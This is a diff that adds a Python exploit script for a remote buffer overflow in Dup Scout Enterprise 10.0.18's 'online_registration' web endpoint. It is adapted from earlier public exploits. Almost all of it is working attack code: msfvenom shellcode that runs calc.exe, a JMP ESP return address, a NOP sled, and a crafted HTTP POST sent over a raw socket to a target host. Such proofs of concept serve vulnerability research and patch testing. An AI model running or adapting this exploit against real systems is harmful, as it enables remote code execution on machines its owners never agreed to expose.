@@ -1,0 +1,63 @@
+# Dup Scout Enterprise 10.0.18 - 'online_registration' Remote Buffer Overflow
+# Requires web service to be enabled.
+# Tested on Windows 10 Pro (x64)
+# Based on: https://www.exploit-db.com/exploits/43145 and https://www.exploit-db.com/exploits/40457
+# Credits: Tulpa and SICKNESS for original exploits
+# Modified: @0rbz_
+
+import socket,os,time,struct,argparse,sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--host', required=True)
+args = parser.parse_args()
+
+host = args.host
+port = 80
+
+# msfvenom --platform windows -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f py
+
+buf =  ""
+buf += "\xb8\xa0\xa1\xfd\x38\xd9\xf7\xd9\x74\x24\xf4\x5a\x31"
+buf += "\xc9\xb1\x31\x31\x42\x13\x83\xc2\x04\x03\x42\xaf\x43"
+buf += "\x08\xc4\x47\x01\xf3\x35\x97\x66\x7d\xd0\xa6\xa6\x19"
+buf += "\x90\x98\x16\x69\xf4\x14\xdc\x3f\xed\xaf\x90\x97\x02"
+buf += "\x18\x1e\xce\x2d\x99\x33\x32\x2f\x19\x4e\x67\x8f\x20"
+buf += "\x81\x7a\xce\x65\xfc\x77\x82\x3e\x8a\x2a\x33\x4b\xc6"
+buf += "\xf6\xb8\x07\xc6\x7e\x5c\xdf\xe9\xaf\xf3\x54\xb0\x6f"
+buf += "\xf5\xb9\xc8\x39\xed\xde\xf5\xf0\x86\x14\x81\x02\x4f"
+buf += "\x65\x6a\xa8\xae\x4a\x99\xb0\xf7\x6c\x42\xc7\x01\x8f"
+buf += "\xff\xd0\xd5\xf2\xdb\x55\xce\x54\xaf\xce\x2a\x65\x7c"
+buf += "\x88\xb9\x69\xc9\xde\xe6\x6d\xcc\x33\x9d\x89\x45\xb2"
+buf += "\x72\x18\x1d\x91\x56\x41\xc5\xb8\xcf\x2f\xa8\xc5\x10"
+buf += "\x90\x15\x60\x5a\x3c\x41\x19\x01\x2a\x94\xaf\x3f\x18"
+buf += "\x96\xaf\x3f\x0c\xff\x9e\xb4\xc3\x78\x1f\x1f\xa0\x77"
+buf += "\x55\x02\x80\x1f\x30\xd6\x91\x7d\xc3\x0c\xd5\x7b\x40"
+buf += "\xa5\xa5\x7f\x58\xcc\xa0\xc4\xde\x3c\xd8\x55\x8b\x42"
+buf += "\x4f\x55\x9e\x20\x0e\xc5\x42\x89\xb5\x6d\xe0\xd5"
+
+buffer = "\x41" * 260
+buffer += struct.pack("<L", 0x10090c83) # JMP ESP - libspp
+buffer += "\x90" * 20
+buffer += buf
+buffer += "\x90" * (10000 - len(buffer))
+
+evil =  "POST /online_registration HTTP/1.1\r\n"
+evil += "Host: " + sys.argv[2] +"\r\n"
+evil += "User-Agent: Mozilla/5.0\r\n"
+evil += "Connection: close\r\n"
+evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+evil += "Accept-Language: en-us,en;q=0.5\r\n"
+evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
+evil += "Keep-Alive: 300\r\n"
+evil += "Proxy-Connection: keep-alive\r\n"
+evil += "Content-Type: application/x-www-form-urlencoded\r\n"
+evil += "Content-Length: 17000\r\n\r\n"
+evil += "customer_name=" + buffer
+evil += "&unlock_key=" + buffer + "\r\n"
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect((host,port))
+print 'Sending evil buffer...'
+s.send(evil)
+print 'Payload Sent!'
+s.close()
